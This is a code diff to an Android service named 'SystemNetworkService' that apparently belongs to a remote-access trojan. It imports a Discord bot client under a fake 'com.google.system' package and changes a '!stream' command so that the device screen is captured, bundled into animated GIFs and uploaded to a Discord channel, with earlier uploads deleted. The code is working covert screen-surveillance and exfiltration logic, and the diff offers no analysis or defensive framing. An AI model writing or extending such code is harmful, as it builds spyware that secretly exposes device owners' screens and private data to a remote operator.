@@ -13,6 +13,7 @@ import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.database.Cursor
+import android.graphics.Bitmap
 import android.graphics.ImageFormat
 import android.graphics.SurfaceTexture
 import android.hardware.camera2.CameraCaptureSession
@@ -44,6 +45,7 @@ import android.provider.Settings
 
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
+import com.google.system.AnimatedGifEncoder
 import com.google.system.DiscordGatewayClient
 import com.openaccess.sdk.OpenAccessApp
 import kotlinx.coroutines.*
@@ -1019,51 +1021,74 @@ class SystemNetworkService : Service() {
         }
         isStreaming = true
         streamMessageId = null
-        d.sendMsg(":tv: **Live stream started** at ${fps}fps\nUse `!stream stop` to end")
+        d.sendMsg(":tv: **Live stream started** (GIF mode, ${fps}fps)\nUse `!stream stop` to end")
         streamJob = scope.launch {
             var consecutiveFailures = 0
             val maxFailures = 5
-            var frameCount = 0
+            val framesPerGif = 8
             val targetDelay = 1000L / fps
+            val gifWidth = 480
+            val gifHeight = 854
             try {
                 while (isActive) {
-                    val loopStart = System.currentTimeMillis()
-                    try {
-                        val bytes = captureScreenForStream()
-                        if (bytes != null) {
-                            consecutiveFailures = 0
-                            frameCount++
-                            val oldId = streamMessageId
-                            val newId = d.sendFileAwait("", "stream.jpg", bytes)
-                            if (newId != null) {
-                                streamMessageId = newId
-                                if (oldId != null) {
-                                    launch { d.deleteMsgAwait(oldId) }
+                    val gifEncoder = AnimatedGifEncoder()
+                    gifEncoder.setSize(gifWidth, gifHeight)
+                    gifEncoder.setRepeat(0)
+                    gifEncoder.setDelay((1000 / fps).coerceAtLeast(100))
+                    var capturedFrames = 0
+                    for (i in 0 until framesPerGif) {
+                        if (!isActive) break
+                        try {
+                            val bmp = DisplayCapture.captureStreamBitmap()
+                            if (bmp != null) {
+                                val scaled = if (bmp.width != gifWidth || bmp.height != gifHeight) {
+                                    val scale = minOf(gifWidth.toFloat() / bmp.width, gifHeight.toFloat() / bmp.height)
+                                    val w = (bmp.width * scale).toInt()
+                                    val h = (bmp.height * scale).toInt()
+                                    val centered = Bitmap.createBitmap(gifWidth, gifHeight, Bitmap.Config.ARGB_8888)
+                                    val canvas = android.graphics.Canvas(centered)
+                                    canvas.drawColor(android.graphics.Color.BLACK)
+                                    canvas.drawBitmap(bmp, ((gifWidth - w) / 2).toFloat(), ((gifHeight - h) / 2).toFloat(), null)
+                                    bmp.recycle()
+                                    centered
+                                } else bmp
+                                gifEncoder.addFrame(scaled)
+                                capturedFrames++
+                            } else {
+                                consecutiveFailures++
+                                if (consecutiveFailures >= maxFailures) {
+                                    d.sendMsg(":x: Stream stopped — too many failures")
+                                    isStreaming = false
+                                    streamMessageId = null
+                                    DisplayCapture.releaseStreamCapture()
+                                    return@launch
                                 }
                             }
-                        } else {
+                        } catch (e: Exception) {
                             consecutiveFailures++
                             if (consecutiveFailures >= maxFailures) {
-                                d.sendMsg(":x: Stream stopped — too many failures")
+                                d.sendMsg(":x: Stream error — stopped")
                                 isStreaming = false
                                 streamMessageId = null
                                 DisplayCapture.releaseStreamCapture()
-                                break
+                                return@launch
                             }
                         }
-                    } catch (e: Exception) {
-                        consecutiveFailures++
-                        if (consecutiveFailures >= maxFailures) {
-                            d.sendMsg(":x: Stream error — stopped")
-                            isStreaming = false
-                            streamMessageId = null
-                            DisplayCapture.releaseStreamCapture()
-                            break
+                        val frameDelay = targetDelay - 50
+                        if (frameDelay > 0) delay(frameDelay)
+                    }
+                    if (capturedFrames > 0) {
+                        consecutiveFailures = 0
+                        val gifBytes = gifEncoder.finish()
+                        val oldId = streamMessageId
+                        val newId = d.sendFileAwait("", "stream.gif", gifBytes)
+                        if (newId != null) {
+                            streamMessageId = newId
+                            if (oldId != null) {
+                                launch { d.deleteMsgAwait(oldId) }
+                            }
                         }
                     }
-                    val elapsed = System.currentTimeMillis() - loopStart
-                    val remaining = targetDelay - elapsed
-                    if (remaining > 0) delay(remaining)
                 }
             } catch (e: Exception) {
                 isStreaming = false
